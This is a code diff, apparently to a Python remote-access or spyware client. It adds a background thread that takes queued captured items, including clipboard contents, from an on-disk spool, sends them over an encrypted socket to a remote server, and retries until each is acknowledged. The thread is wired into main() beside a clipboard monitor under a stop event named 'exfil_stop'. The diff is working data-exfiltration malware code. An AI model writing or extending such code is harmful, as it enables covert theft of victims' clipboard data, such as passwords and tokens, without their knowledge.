@@ -160,6 +160,28 @@ def _clipboard_flush_thread(clipboard_monitor, spool, stop_event):
             spool.push("clipboard", {"data": latest, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})
 
 
+def _spool_sender_thread(sock, key, spool, stop_event, send_lock, interval=5):
+    """Drains spool to server. Retries every `interval` seconds."""
+    while not stop_event.is_set():
+        for item in spool.pending():
+            if stop_event.is_set():
+                break
+            try:
+                payload = json.dumps({
+                    "kind": item["kind"],
+                    "ts": item["ts"],
+                    "payload": item["payload"]
+                })
+                with send_lock:
+                    send_msg(sock, f"spool_data {payload}", key)
+                ack = recv_msg(sock, key)
+                if ack == b"SPOOL_ACK":
+                    spool.ack(item["id"])
+            except Exception:
+                break  # connection lost — spool stays on disk
+        stop_event.wait(interval)
+
+
 def test_connection(host, port):
     logger.info(f"Target server: {host}:{port}")
     try:
@@ -472,6 +494,11 @@ def main():
                 threading.Thread(
                     target=_clipboard_flush_thread,
                     args=(clipboard_monitor, _spool, exfil_stop),
+                    daemon=True
+                ).start()
+                threading.Thread(
+                    target=_spool_sender_thread,
+                    args=(client, key, _spool, exfil_stop, send_lock),
                     daemon=True
                 ).start()
 
